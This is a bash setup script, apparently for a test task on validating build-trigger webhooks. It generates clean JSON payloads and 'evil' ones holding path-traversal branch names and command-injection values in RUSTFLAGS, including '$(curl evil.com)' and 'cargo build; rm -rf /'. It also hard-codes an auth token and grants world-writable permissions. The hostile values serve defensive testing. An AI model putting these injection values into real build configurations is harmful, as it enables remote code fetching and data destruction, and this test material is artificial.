#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip jq espeak-ng
    pip3 install pytest

    mkdir -p /app/corpus/clean
    mkdir -p /app/corpus/evil

    espeak-ng -w /app/authorization_memo.wav "Hello team, please update the webhook proxies. The new deployment authorization token is RustyPipeline2024"

    python3 -c '
import os
import json

for i in range(20):
    clean_data = {
        "action": "trigger_build",
        "auth_token": "RustyPipeline2024",
        "branch": f"feature-branch_{i}",
        "build_env": {
            "RUSTFLAGS": "-C target-cpu=native",
            "CARGO_PROFILE": "release"
        }
    }
    with open(f"/app/corpus/clean/payload_{i}.json", "w") as f:
        json.dump(clean_data, f)

evil_cases = [
    {"auth_token": "WrongToken2024", "branch": "main", "build_env": {"RUSTFLAGS": ""}},
    {"auth_token": "RustyPipeline2024", "branch": "../main", "build_env": {"RUSTFLAGS": ""}},
    {"auth_token": "RustyPipeline2024", "branch": "main%2e%2e", "build_env": {"RUSTFLAGS": ""}},
    {"auth_token": "RustyPipeline2024", "branch": "main", "build_env": {"RUSTFLAGS": "$(curl evil.com)"}},
    {"auth_token": "RustyPipeline2024", "branch": "main", "build_env": {"RUSTFLAGS": "cargo build; rm -rf /"}},
]

for i in range(20):
    case = evil_cases[i % len(evil_cases)]
    evil_data = {
        "action": "trigger_build",
        "auth_token": case["auth_token"],
        "branch": case["branch"],
        "build_env": case["build_env"]
    }
    with open(f"/app/corpus/evil/payload_{i}.json", "w") as f:
        json.dump(evil_data, f)
'

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
